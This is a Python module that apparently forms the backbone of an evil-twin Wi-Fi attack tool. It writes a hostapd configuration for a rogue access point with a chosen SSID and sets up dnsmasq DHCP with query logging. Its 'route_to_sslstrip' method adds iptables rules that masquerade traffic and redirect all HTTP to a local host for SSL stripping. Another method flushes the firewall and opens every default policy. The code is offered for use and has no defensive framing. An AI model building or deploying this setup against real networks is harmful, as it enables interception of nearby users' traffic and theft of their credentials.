import subprocess
import shutil
import time

HOSTAPD_CONF = "../hostapd.conf"
DNSMASQ_CONF = "../dnsmasq.conf"

def bash_command(command):

    command = command.split()
    p = subprocess.Popen(command, stdout=subprocess.PIPE)
    output, err = p.communicate()


def enable_packet_forwarding():

    with open("/proc/sys/net/ipv4/ip_forward", "w") as fd:
        fd.write("1")


def disable_packet_forwarding():

    with open("/proc/sys/net/ipv4/ip_forward", "w") as fd:
        fd.write("0")


class IPTables(object):

    _instance = None

    def __init__(self):

        self.running = False
        self.reset()

    @staticmethod
    def get_instance():

        if IPTables._instance is None:
            IPTables._instance = IPTables()
        return IPTables._instance

    def route_to_sslstrip(self, phys, upstream):

        bash_command("iptables --flush")

        bash_command(
            "iptables --table nat --append POSTROUTING --out-interface %s -j MASQUERADE"
            % phys
        )

        bash_command("iptables --append FORWARD --in-interface %s -j ACCEPT" % upstream)

        bash_command(
            "iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80"
        )

        bash_command("iptables -t nat -A POSTROUTING -j MASQUERADE")

    def reset(self):

        bash_command("iptables -P INPUT ACCEPT")
        bash_command("iptables -P FORWARD ACCEPT")
        bash_command("iptables -P OUTPUT ACCEPT")

        bash_command("iptables --flush")
        bash_command("iptables --flush -t nat")


class HostAPD(object):

    _instance = None

    def __init__(self):

        self.running = False
        self.conf = HOSTAPD_CONF

    @staticmethod
    def get_instance():

        if HostAPD._instance is None:
            HostAPD._instance = HostAPD()
        return HostAPD._instance

    def start(self):

        if self.running:
            raise Exception("[Utils] hostapd is already running.")

        self.running = True
        bash_command("hostapd %s -B" % self.conf)
        print("[+] hostapd started")
        time.sleep(2)

    def stop(self):

        if not self.running:
            raise Exception("[Utils] hostapd is not running.")

        bash_command("killall hostapd")
        time.sleep(2)

    def configure(
        self, upstream, ssid, channel,
    ):

        # make backup of existing configuration file
        shutil.copy(self.conf, "%s.evil_twin.bak" % self.conf)

        with open(self.conf, "w") as fd:

            fd.write(
                "\n".join(
                    [
                        "interface=%s" % upstream,
                        "driver=nl80211",
                        "ssid=%s" % ssid,
                        "channel=%d" % channel,
                        "hw_mode=g",
                        "macaddr_acl=0",
                        "auth_algs=1",
                        "ignore_broadcast_ssid=0",
                    ]
                )
            )

    def restore(self):

        shutil.copy("%s.evil_twin.bak" % self.conf, self.conf)


class DNSMasq(object):

    _instance = None

    def __init__(self):

        self.running = False
        self.conf = DNSMASQ_CONF

    @staticmethod
    def get_instance():

        if DNSMasq._instance is None:
            DNSMasq._instance = DNSMasq()
        return DNSMasq._instance

    def start(self):

        if self.running:
            raise Exception("[Utils] dnsmasq is already running.")

        self.running = True
        bash_command("dnsmasq -C %s" % self.conf)
        print("[+] dnsmasq started")
        time.sleep(2)

    def stop(self):

        if not self.running:
            raise Exception("[Utils] dnsmasq is not running.")

        bash_command("killall dnsmasq")
        time.sleep(2)

    def configure(
        self,
        upstream,
        dhcp_range,
        dhcp_options=[],
    ):

        # make backup of existing configuration file
        shutil.copy(self.conf, "%s.evil_twin.bak" % self.conf)

        with open(self.conf, "w") as fd:

            fd.write(
                "\n".join(
                    [
                        "interface=%s" % upstream,
                        "dhcp-range=%s" % dhcp_range,
                        "\n".join("dhcp-option=%s" % o for o in dhcp_options),
                        "server=8.8.8.8",
                        "log-queries",
                        "log-dhcp",
                        "listen-address=127.0.0.53,127.0.0.1",
                    ]
                )
            )

    def restore(self):

        shutil.copy("%s.evil_twin.bak" % self.conf, self.conf)
